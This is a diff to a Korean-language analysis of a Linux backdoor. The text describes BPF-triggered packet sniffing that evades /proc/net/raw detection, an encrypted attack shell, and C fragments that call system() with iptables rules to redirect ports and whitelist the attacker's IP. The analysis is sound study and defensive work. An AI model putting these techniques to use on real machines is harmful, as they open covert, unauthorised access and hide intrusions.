@@ -93,6 +93,7 @@ set_proc_name(argc, argv, cfg.mask);
 ### 5. BPF 기반 패킷 스니핑
 
 - 로우 소켓을 통해 NIC를 직접 제어하여 IP 패킷을 캡처한다. 이 때 BPF 필터 (struct sock_fprog)를 사용해 특정 조건 (프로토콜, 포트, 패턴 등)을 만족하는 패킷만을 처리한다.
+- BPF가 아닌 다른 방식으로 패킷을 수신하려면 raw socket을 항상 열어두고 있어야 하고, 이는 `/proc/net/raw` 등에 노출되어 탐지되기 쉽다. 여기서 BPF는 시작 신호를 탐지하기 위해서만 사용되고 이후 암호화된 TTY 쉘을 직접 열어 공격 행위를 수행하기 위한 별도 동작을 수행한다.
 
 ```c
 // Filter Options Build Filter Struct
@@ -273,30 +274,16 @@ while (1) {
 }
 ```
 
-특수 제어 코드 `0x0b` (ECHAR)가 수신되면, 그 다음 4바이트를 읽어 터미널 창 크기를 설정한다.
+쉘 연결시에, 역방향 연결이 불가능한 상황에서는 iptables 명령어를 사용하여 포트를 리디렉션함으로써 외부 접속을 유도한다.
 
-```c
-if (buf[i] == ECHAR) {
-    struct winsize ws;
-    ws.ws_col = (buf[i+1] << 8) + buf[i+2];
-    ws.ws_row = (buf[i+3] << 8) + buf[i+4];
-    ioctl(pty, TIOCSWINSZ, &ws);
-    kill(0, SIGWINCH); // 쉘에 SIGWINCH 전달
-}
-```
-
-### 10. iptables를 통한 포트 포워딩 및 제거
-
-- 역방향 연결이 불가능한 상황에서는 iptables 명령어를 사용하여 포트를 리디렉션함으로써 외부 접속을 유도한다.
-
-  - e.g. 외부에서 `192.168.0.100:12345`로 접속 시 내부에서는 `127.0.0.1:54321`로 전달되도록 설정
+- e.g. 외부에서 `192.168.0.100:12345`로 접속 시 내부에서는 `127.0.0.1:54321`로 전달되도록 설정
 
 ```c
 snprintf(cmd, sizeof(cmd), "/sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d", ip, fromport, toport);
 system(cmd);
 ```
 
-- 그리고 방화벽에서 공격자의 IP를 허용하도록 설정한다.
+그리고 방화벽에서 공격자의 IP를 허용하도록 설정한다.
 
 ```c
 snprintf(inputcmd, sizeof(inputcmd), "/sbin/iptables -I INPUT -p tcp -s %s -j ACCEPT", ip);
